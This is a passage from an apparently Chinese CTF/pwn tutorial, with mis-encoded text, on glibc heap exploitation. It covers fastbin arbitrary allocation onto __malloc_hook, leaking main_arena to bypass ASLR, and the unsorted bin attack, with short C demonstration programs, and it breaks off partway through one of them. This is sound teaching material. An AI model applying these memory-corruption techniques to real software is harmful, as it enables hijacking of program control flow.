src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A856.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨56.png"></p><hr><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><blockquote><p>Arbitrary Alloc å…¶å®ä¸ Alloc to stack æ˜¯å®Œå…¨ç›¸åŒçš„ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯<strong>åˆ†é…çš„ç›®æ ‡ä¸å†æ˜¯æ ˆä¸­</strong></p><p>Arbitrary Alloc åœ¨ CTF ä¸­ä½¿ç”¨æ›´åŠ é¢‘ç¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å­—èŠ‚é”™ä½ç­‰æ–¹æ³•æ¥ç»•è¿‡ <code>size</code> åŸŸçš„æ£€éªŒï¼Œå®ç°ä»»æ„åœ°å€åˆ†é… <code>chunk</code>ï¼Œæœ€åçš„æ•ˆæœä¹Ÿå°±ç›¸å½“äº<strong>ä»»æ„åœ°å€å†™ä»»æ„å€¼</strong></p></blockquote><p>å®é™…ä¸Šï¼Œåªè¦æ»¡è¶³ç›®æ ‡åœ°å€å­˜åœ¨åˆæ³•çš„ <code>size</code> åŸŸï¼ˆè¿™ä¸ª <code>size</code> åŸŸæ˜¯æ„é€ çš„ï¼Œè¿˜æ˜¯è‡ªç„¶å­˜åœ¨çš„éƒ½æ— å¦¨ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ <code>chunk</code> åˆ†é…åˆ°ä»»æ„çš„å¯å†™å†…å­˜ä¸­ï¼Œæ¯”å¦‚ï¼š<code>bss</code>ã€<code>heap</code>ã€<code>data</code>ã€<code>stack</code> ç­‰ç­‰</p><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>chunk_a<span class="token punctuation">;</span>

    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> chunk1 <span class="token operator">=</span> <span class="token number">0x7ffff7dd1af5</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk_a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨å­—èŠ‚é”™ä½æ¥å®ç°ç›´æ¥åˆ†é… <code>fast bin</code> åˆ° <code>__malloc_hook</code> çš„ä½ç½®ï¼Œç›¸å½“äºè¦†ç›– <code>__malloc_hook</code> æ¥æ§åˆ¶ç¨‹åºæµç¨‹</p></blockquote><p>ä¸Šè¿°ä»£ç ä¸­çš„ <code>0x7ffff7dd1af5</code> æ˜¯æ ¹æ®æœ¬æœºçš„æƒ…å†µå¾—å‡ºçš„å€¼ï¼Œæƒ³è¦å¾—åˆ°è¿™ä¸ªå€¼ï¼Œé¦–å…ˆæˆ‘ä»¬è¦è§‚å¯Ÿæ¬²å†™å…¥åœ°å€ <code>__malloc_hook</code> é™„è¿‘æ˜¯å¦å­˜åœ¨å¯ä»¥å­—èŠ‚é”™ä½çš„æƒ…å†µ</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A857.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨57.png"></p><p>å›¾ä¸­ <code>0x7ffff7dd1b10</code> æ˜¯æˆ‘ä»¬æƒ³è¦æ§åˆ¶çš„ <code>__malloc_hook</code> çš„åœ°å€ï¼Œäºæ˜¯æˆ‘ä»¬å‘ä¸Šå¯»æ‰¾æ˜¯å¦å¯ä»¥é”™ä½å‡ºä¸€ä¸ªåˆæ³•çš„ <code>size</code> åŸŸã€‚å› ä¸ºè¿™æ˜¯ä¸ª 64 ä½ç¨‹åºï¼Œå› æ­¤ <code>fast bin</code> çš„èŒƒå›´ä¸º 32 å­—èŠ‚åˆ° 128 å­—èŠ‚ (<code>0x20 - 0x80</code>)</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//è¿™é‡Œçš„ size æŒ‡ç”¨æˆ·åŒºåŸŸï¼Œå› æ­¤è¦å° 2 å€ SIZE_SZ</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x30</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x70</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è§‚å¯Ÿå‘ç° <code>0x7ffff7dd1af5</code> å¤„å¯ä»¥å®ç°é”™ä½æ„é€ å‡ºä¸€ä¸ª <code>0x000000000000007f</code>ï¼Œå› ä¸º <code>0x7f</code> åœ¨è®¡ç®— <code>fast bin index</code> æ—¶ï¼Œæ˜¯å±äº <code>index 5</code> çš„ï¼Œå³ <code>chunk</code> å¤§å°ä¸º <code>0x70</code>ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">##define <span class="token function">fastbin_index</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span>                                                      \
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>SIZE_SZ <span class="token operator">==</span> <span class="token number">8</span> <span class="token operator">?</span> <span class="token number">4</span> <span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span>   <span class="token comment">// æ³¨æ„ sz çš„å¤§å°æ˜¯ unsigned intï¼Œå› æ­¤åªå  4 ä¸ªå­—èŠ‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è€Œ <code>chunk</code> å¤§å°ä¸º <code>0x70</code> åˆåŒ…å«äº† <code>0x10</code> çš„ <code>chunk_header</code>ï¼Œå› æ­¤æˆ‘ä»¬é€‰æ‹©åˆ†é… <code>0x60</code> çš„ <code>fast bin</code>ï¼Œå°†å…¶åŠ å…¥é“¾è¡¨ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A858.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨58.png"></p><p>ç»è¿‡ä¸¤æ¬¡ <code>malloc</code> åˆ†é…åï¼Œå¯ä»¥è§‚å¯Ÿåˆ° <code>chunk</code> è¢«åˆ†é…åˆ° <code>0x7ffff7dd1afd</code>ï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ§åˆ¶ <code>__malloc_hook</code> çš„å†…å®¹ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A859.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨59.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A860.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨60.png"></p><p>åœ¨æˆ‘çš„ Glibc 2.23 ä¸­ <code>__realloc_hook</code> ä¸ <code>__malloc_hook</code> æ˜¯è¿åœ¨ä¸€èµ·çš„ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A861.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨61.png"></p><hr><h1 id="Unsorted-bin-Attack"><a href="#Unsorted-bin-Attack" class="headerlink" title="Unsorted bin Attack"></a>Unsorted bin Attack</h1><blockquote><p>Unsorted bin Attack æ˜¯ä¸€ç±»æ¼æ´çš„åˆ©ç”¨æ–¹æ³•ï¼Œæ˜¯æŒ‡æ‰€æœ‰åŸºäº <code>unsorted bin</code> æœºåˆ¶çš„æ¼æ´åˆ©ç”¨æ–¹æ³•</p><p>å‚è€ƒæ–‡ç« ï¼š<a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bnNvcnRlZC1iaW4tYXR0YWNrLyN1bnNvcnRlZC1iaW4=">Unsorted Bin Attack - CTF Wiki</a></p></blockquote><p>Unsorted bin Attack çš„åˆ©ç”¨å‰æï¼š</p><ul><li>æ§åˆ¶ <code>unsorted bin chunk</code> çš„ <code>bk</code> æŒ‡é’ˆ</li></ul><p>Unsorted bin Attack å¯ä»¥è¾¾åˆ°çš„æ•ˆæœæ˜¯ï¼š<strong>å®ç°ä¿®æ”¹ä»»æ„åœ°å€å€¼ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ•°å€¼</strong></p><hr><h2 id="Unsorted-bin-Leak"><a href="#Unsorted-bin-Leak" class="headerlink" title="Unsorted bin Leak"></a>Unsorted bin Leak</h2><blockquote><p><code>unsorted bin</code> é¦–å…ˆå¯ä»¥ç”¨æ¥<strong>æ³„éœ²ä¸€äº›ä¿¡æ¯</strong></p></blockquote><p>ç”±äº <code>unsorted bin</code>&nbsp;åœ¨ç®¡ç†æ—¶ä¸ºå¾ªç¯åŒå‘é“¾è¡¨ï¼Œè‹¥&nbsp;<code>unsorted bin</code>&nbsp;ä¸­æœ‰ä¸¤ä¸ª&nbsp;<code>bin</code>ï¼Œé‚£ä¹ˆè¯¥é“¾è¡¨ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A862.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨62.png"></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨è¯¥é“¾è¡¨ä¸­å¿…æœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆä¸å‡†ç¡®çš„è¯´ï¼Œæ˜¯å°¾èŠ‚ç‚¹ï¼Œè¿™ä¸ªå°±æ„ä¼šä¸€ä¸‹æŠŠï¼Œæ¯•ç«Ÿå¾ªç¯é“¾è¡¨å®é™…ä¸Šæ²¡æœ‰å¤´å°¾ï¼‰çš„&nbsp;<code>fd</code>&nbsp;æŒ‡é’ˆä¼šæŒ‡å‘&nbsp;<code>main_arena</code>&nbsp;ç»“æ„ä½“å†…éƒ¨</p><p>å¦‚æœæˆ‘ä»¬å¯ä»¥æŠŠæ­£ç¡®çš„&nbsp;<code>fd</code>&nbsp;æŒ‡é’ˆæ³„éœ²å‡ºæ¥ï¼Œå°±å¯ä»¥è·å¾—ä¸€ä¸ªä¸&nbsp;<code>main_arena</code>&nbsp;æœ‰å›ºå®šåç§»çš„åœ°å€ï¼Œè¿™ä¸ªåç§»å¯ä»¥é€šè¿‡ GDB è°ƒè¯•å¾—å‡º</p><blockquote><p><code>main_arena</code>&nbsp;æ˜¯ä¸€ä¸ª&nbsp;<code>struct malloc_state</code>&nbsp;ç±»å‹çš„å…¨å±€å˜é‡ï¼Œæ˜¯&nbsp;<code>ptmalloc2</code>&nbsp;ç®¡ç†ä¸»åˆ†é…åŒºçš„å”¯ä¸€å®ä¾‹ï¼Œå…¶ä¼šè¢«åˆ†é…åœ¨&nbsp;<code>.data</code>&nbsp;æˆ–è€…&nbsp;<code>.bss</code>&nbsp;ç­‰æ®µä¸Š</p><p><strong>å¦‚æœæˆ‘ä»¬æœ‰è¿›ç¨‹æ‰€ä½¿ç”¨çš„&nbsp;<code>libc.so</code>&nbsp;æ–‡ä»¶çš„è¯ï¼Œå°±å¯ä»¥è·å¾—&nbsp;<code>main_arena</code>&nbsp;ä¸&nbsp;libc&nbsp;åŸºåœ°å€çš„åç§»ï¼Œå®ç°å¯¹&nbsp;<code>ASLR</code>&nbsp;çš„ç»•è¿‡</strong></p></blockquote><p>è·å¾—&nbsp;<code>main_arena</code>&nbsp;ä¸&nbsp;libc&nbsp;åŸºåœ°å€çš„åç§»ä¸»è¦æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><ul><li>é€šè¿‡ <code>__malloc_trim</code> å‡½æ•°å¾—å‡º</li><li>é€šè¿‡ <code>__malloc_hook</code> ç›´æ¥è®¡ç®—</li></ul><p>ä¸€èˆ¬æ¥è¯´ï¼Œè¦å®ç° Unsorted bin Leakï¼Œéœ€è¦æœ‰&nbsp;UAF</p><blockquote><p>åœ¨ CTF ä¸­ï¼Œä¸€èˆ¬çš„ç¬”è®°ç®¡ç†é¢˜éƒ½ä¼šæœ‰&nbsp;<code>show</code>&nbsp;çš„åŠŸèƒ½ï¼Œå¯¹<strong>å¤„äº unsorted bin é“¾è¡¨å°¾çš„èŠ‚ç‚¹</strong>&nbsp;<code>show</code>&nbsp;å°±å¯ä»¥è·å¾—&nbsp;<code>libc</code>&nbsp;çš„åŸºåœ°å€äº†</p><p>å¦å¤–ï¼ŒCTF&nbsp;ä¸­å †å¾€å¾€æ˜¯åˆšåˆšåˆå§‹åŒ–çš„ï¼Œæ‰€ä»¥&nbsp;<code>unsorted bin</code>&nbsp;ä¸€èˆ¬éƒ½æ˜¯å¹²å‡€çš„ï¼Œ<mark>å½“&nbsp;<code>unsorted bin</code>&nbsp;ä¸­åªå­˜åœ¨ä¸€ä¸ª&nbsp;<code>bin</code>&nbsp;çš„æ—¶å€™ï¼Œè¯¥&nbsp;<code>bin</code>&nbsp;çš„&nbsp;<code>fd</code>&nbsp;å’Œ&nbsp;<code>bk</code>&nbsp;éƒ½ä¼šæŒ‡å‘&nbsp;<code>main_arena</code>&nbsp;ä¸­</mark></p></blockquote><p>å¦å¤–ï¼Œ<strong>å¦‚æœæˆ‘ä»¬æ— æ³•åšåˆ°è®¿é—®é“¾è¡¨å°¾ï¼Œä½†æ˜¯å¯ä»¥è®¿é—®é“¾è¡¨å¤´</strong>ï¼š</p><ul><li>åœ¨ 32 ä½çš„ç¯å¢ƒä¸‹ï¼Œå¯¹é“¾è¡¨å¤´è¿›è¡Œ&nbsp;<code>printf</code>&nbsp;ç­‰æ“ä½œï¼Œå¾€å¾€å¯ä»¥æŠŠ&nbsp;<code>fd</code>&nbsp;å’Œ&nbsp;<code>bk</code>&nbsp;ä¸€èµ·è¾“å‡ºå‡ºæ¥ï¼Œè¿™ä¸ªæ—¶å€™åŒæ ·å¯ä»¥å®ç°æœ‰æ•ˆçš„ leak</li><li>åœ¨ 64 ä½çš„ç¯å¢ƒä¸‹ï¼Œç”±äºé«˜åœ°å€å¾€å¾€ä¸º&nbsp;<code>\x00</code>ï¼Œå¾ˆå¤šè¾“å‡ºå‡½æ•°ä¼šè¢«æˆªæ–­ï¼Œè¿™ä¸ªæ—¶å€™å¯èƒ½å°±éš¾ä»¥å®ç°æœ‰æ•ˆçš„ leak</li></ul><hr><h3 id="é€šè¿‡-malloc-trim-å¾—åˆ°åç§»"><a href="#é€šè¿‡-malloc-trim-å¾—åˆ°åç§»" class="headerlink" title="é€šè¿‡ __malloc_trim() å¾—åˆ°åç§»"></a>é€šè¿‡ __malloc_trim() å¾—åˆ°åç§»</h3><p>åœ¨&nbsp;<code>malloc.c</code>&nbsp;ä¸­æœ‰è¿™æ ·ä¸€æ®µä»£ç ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span>
<span class="token function">__malloc_trim</span> <span class="token punctuation">(</span>size_t s<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>__malloc_initialized <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token function">ptmalloc_init</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  mstate ar_ptr <span class="token operator">=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">;</span>   <span class="token comment">// &lt;= here!</span>
  <span class="token keyword">do</span>
    <span class="token punctuation">{</span>
      <span class="token function">__libc_lock_lock</span> <span class="token punctuation">(</span>ar_ptr<span class="token operator">-&gt;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
      result <span class="token operator">|=</span> <span class="token function">mtrim</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">__libc_lock_unlock</span> <span class="token punctuation">(</span>ar_ptr<span class="token operator">-&gt;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>

      ar_ptr <span class="token operator">=</span> ar_ptr<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span>ar_ptr <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„åˆ°&nbsp;<code>mstate ar_ptr = &amp;main_arena</code>&nbsp;è¿™é‡Œå¯¹&nbsp;<code>main_arena</code>&nbsp;è¿›è¡Œäº†è®¿é—®ï¼Œæ‰€ä»¥<strong>é€šè¿‡ IDA åˆ†æ libc æ–‡ä»¶ä¸­çš„ <code>malloc_trim()</code> å‡½æ•°å°±å¯ä»¥å¾—åˆ° libc åç§»äº†</strong></p><p>ä»¥ Glibc 2.23 ä¸­çš„ <code>malloc_trim()</code> å‡½æ•°ä¸ºä¾‹ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A863.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨63.png"></p><p>å…¶ä½äº <code>.bss</code> æ®µä¸Šï¼Œå¯è§ <code>main_arena</code>&nbsp;ä¸&nbsp;libc&nbsp;åŸºåœ°å€çš„åç§»ä¸º <code>0x3C4B20</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A864.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨64.png"></p><p>æˆ‘ä»¬ä»¥ ã€Š<a href="18c02ebd.html">ã€Asis CTF 2016ã€‘b00ks</a>ã€‹ ä¸€æ–‡ä¸­æ³„æ¼çš„åœ°å€æ¥è¿›è¡ŒéªŒè¯ï¼šï¼ˆåŒä¸º Glibc 2.23 ç¯å¢ƒï¼‰</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks34.png" alt="ã€Asis CTF 2016ã€‘b00ks34.png"></p><p><code>main_arena</code>&nbsp;ä¸&nbsp;libc&nbsp;åŸºåœ°å€çš„åç§»ä¸ºï¼š<code>0x7efea8cc9b20 - 0x7efea8905000 = 0x3c4b20</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A865.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨65.png"></p><hr><h3 id="é€šè¿‡-malloc-hook-è®¡ç®—åç§»"><a href="#é€šè¿‡-malloc-hook-è®¡ç®—åç§»" class="headerlink" title="é€šè¿‡ __malloc_hook è®¡ç®—åç§»"></a>é€šè¿‡ __malloc_hook è®¡ç®—åç§»</h3><p><code>main_arena</code>&nbsp;å’Œ&nbsp;<code>__malloc_hook</code>&nbsp;çš„åœ°å€å·®æ˜¯ 0x10ï¼Œè€Œå¤§å¤šæ•°çš„ libc éƒ½å¯ä»¥ç›´æ¥æŸ¥å‡º&nbsp;<code>__malloc_hook</code>&nbsp;çš„åœ°å€</p><p>å› æ­¤&nbsp;<code>main_arena</code>&nbsp;ä¸&nbsp;libc&nbsp;åŸºåœ°å€çš„åç§»å¯ä»¥ç›´æ¥å¾—åˆ°ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">main_arena_offset <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Unsorted-bin-Attack-1"><a href="#Unsorted-bin-Attack-1" class="headerlink" title="Unsorted bin Attack"></a>Unsorted bin Attack</h2><p>åœ¨ <code>glibc/malloc/malloc.c</code> ä¸­çš„ <code>_int_malloc</code> æœ‰è¿™ä¹ˆä¸€æ®µä»£ç ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* remove from unsorted list */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>bck<span class="token operator">-&gt;</span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): corrupted unsorted chunks 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-&gt;</span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
bck<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“å°†ä¸€ä¸ª <code>unsorted bin</code> å–å‡ºçš„æ—¶å€™ï¼Œä¼šå°† <code>bck -&gt; fd</code> çš„ä½ç½®å†™å…¥æœ¬ <code>unsorted bin</code> çš„ä½ç½®</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>å¦‚æœæˆ‘ä»¬æ§åˆ¶äº† <code>bk</code> çš„å€¼ï¼Œå°±èƒ½å°†&nbsp;<code>unsorted_chunks (av)</code>&nbsp;å†™åˆ°ä»»æ„åœ°å€</strong></p><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> target_var <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
 
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p: %ld\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>target_var<span class="token punctuation">,</span> target_var<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
